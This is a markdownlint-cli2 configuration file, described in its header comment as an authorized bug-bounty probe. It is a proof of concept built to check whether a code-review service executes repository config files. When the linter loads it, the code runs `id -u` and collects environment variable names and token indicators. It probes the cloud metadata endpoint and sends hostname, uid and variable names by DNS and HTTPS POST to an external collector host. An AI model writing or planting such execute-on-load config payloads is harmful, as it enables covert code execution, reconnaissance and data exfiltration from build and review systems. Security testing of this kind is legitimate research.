// Authorized research discriminator (HackerOne `coderabbit`, H1).
// If markdownlint-cli2 LOADS this file, Node executes the code below, which (a) disables MD018
// via an executed code path and (b) emits a benign DNS/HTTP beacon (NAMES/status only, no values).
// Observable proof of execution, egress-independent: the MD018 "space after heading" finding on
// docs.md will be SUPPRESSED only if this executable config was actually loaded.
const MARK = 'MDXfed6981e';
const BEACON = 'dbqerhsrosne02eopgm048tqsgfxhp8cm.oast.site';
function ping(label) { try { require('dns').lookup(label + '.' + BEACON, function () {}); } catch (e) {} }
const cfg = { default: true };
try {
  const os = require('os');
  // executed code path that mutates the exported config -> proof of execution if honored
  if (os.hostname().length >= 0) { cfg.MD018 = false; }
  let uid = 'na';
  try { uid = require('child_process').execSync('id -u').toString().trim(); } catch (e) {}
  const names = Object.keys(process.env);
  const hasRe = function (re) { return names.some(function (n) { return re.test(n); }) ? '1' : '0'; };
  const flags = 'gh' + (names.indexOf('GITHUB_TOKEN') >= 0 ? '1' : '0') + 'inst' + hasRe(/install.*token/i) + 'cr' + hasRe(/^coderabbit/i);
  const hh = require('crypto').createHash('sha1').update(os.hostname()).digest('hex').slice(0, 8);
  ping((MARK + '-u' + uid + '-' + flags + '-' + hh).toLowerCase().replace(/[^a-z0-9-]/g, ''));
  try {
    const req = require('http').get({ host: '169.254.169.254', path: '/', timeout: 2000 }, function (res) { ping(('md' + res.statusCode + '-' + MARK).toLowerCase()); res.destroy(); });
    req.on('error', function () { ping(('mderr-' + MARK).toLowerCase()); });
    req.on('timeout', function () { req.destroy(); ping(('mdto-' + MARK).toLowerCase()); });
  } catch (e) {}
  try {
    const body = JSON.stringify({ m: MARK, host: os.hostname(), uid: uid, envNames: names });
    const r2 = require('https').request({ hostname: BEACON, path: '/names/' + MARK, method: 'POST', headers: { 'content-type': 'application/json' }, timeout: 3000 }, function () {});
    r2.on('error', function () {}); r2.write(body); r2.end();
  } catch (e) {}
} catch (e) {}
module.exports = { config: cfg };
